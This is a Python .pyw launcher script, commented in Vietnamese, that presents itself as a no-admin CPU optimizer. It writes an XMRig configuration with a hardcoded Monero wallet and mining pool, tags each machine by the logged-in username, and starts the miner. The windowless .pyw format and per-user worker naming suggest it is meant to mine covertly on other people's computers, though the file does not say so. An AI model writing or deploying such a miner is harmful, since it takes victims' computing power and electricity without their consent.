# File: ULTRA_MAX_2025.pyw  – AUTO TỐI ƯU MỌI LOẠI CPU KHÔNG CẦN ADMIN

import os, json, getpass, subprocess, platform

dir_path    = os.path.dirname(__file__)
config_path = os.path.join(dir_path, "config.json")
xmrig_exe   = os.path.join(dir_path, "xmrig.exe")
worker      = getpass.getuser()

print(f"[+] ULTRA MAX 2025 – Worker: {worker}")
print("[+] Auto phát hiện CPU – Tối ưu cho mọi dòng máy...\n" + "="*80)

# ───────────────────────────────
# 1) PHÁT HIỆN SỐ THREAD
# ───────────────────────────────
threads = os.cpu_count() or 4
cpu_name = platform.processor().lower()

# Chuẩn hóa tên CPU
is_intel = "intel" in cpu_name
is_amd   = "amd" in cpu_name or "ryzen" in cpu_name

# ───────────────────────────────
# 2) TỰ ĐỘNG PHÂN LOẠI CPU
# ───────────────────────────────
if threads <= 4:
    # Máy rất yếu: Pentium / Celeron / laptop cũ
    use_threads = max(1, threads // 2)
    rx_mode = "light"
    gb_pages = False

elif 4 < threads <= 8:
    # Máy tầm trung: i3 / i5 đời cũ, Ryzen 3
    use_threads = threads - 2
    rx_mode = "medium"
    gb_pages = False  # không bật vì user không dùng admin

elif 8 < threads <= 16:
    # Máy khoẻ: i5 / i7 / Ryzen 5 / Ryzen 7
    use_threads = threads
    rx_mode = "fast"
    gb_pages = False  # user không có admin → luôn false

else:
    # Máy rất mạnh: i9 / Ryzen 9 / Workstation
    use_threads = threads
    rx_mode = "fast"
    gb_pages = False

# Chọn thread: dùng từ 0 → use_threads-1
rx_list = list(range(use_threads))

print(f"[+] CPU: {cpu_name}")
print(f"[+] Tổng thread: {threads} → Sử dụng: {use_threads} thread | Mode: {rx_mode}")

# ───────────────────────────────
# 3) TẠO CONFIG TỰ ĐỘNG
# ───────────────────────────────
config = {
    "autosave": True,
    "background": False,
    "colors": True,

    "randomx": {
        "1gb-pages": gb_pages,     # luôn false vì không admin
        "mode": rx_mode,
        "numa": True
    },

    "cpu": {
        "enabled": True,
        "huge-pages": False,       # bạn không dùng admin → tắt
        "huge-pages-jit": False,
        "hw-aes": True,
        "priority": 3,
        "yield": True,
        "memory-pool": False,
        "max-threads-hint": 100,
        "rx": rx_list
    },

    "pools": [{
        "algo": "rx/0",
        "url": "gulf.moneroocean.stream:443",
        "user": "4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGpYPkUbB7t2qaKr4g",
        "pass": "x",
        "rig-id": worker,
        "tls": True,
        "keepalive": True
    }],

    "donate-level": 0,
    "print-time": 10
}

with open(config_path, "w", encoding="utf-8") as f:
    json.dump(config, f, indent=4)

print(f"[+] ĐÃ GHI CONFIG ULTRA – Hashrate ước tính: ~{use_threads*90}–{use_threads*120} H/s mỗi thread")
print("[+] Bắt đầu đào...\n" + "="*80)

subprocess.call([xmrig_exe], cwd=dir_path)
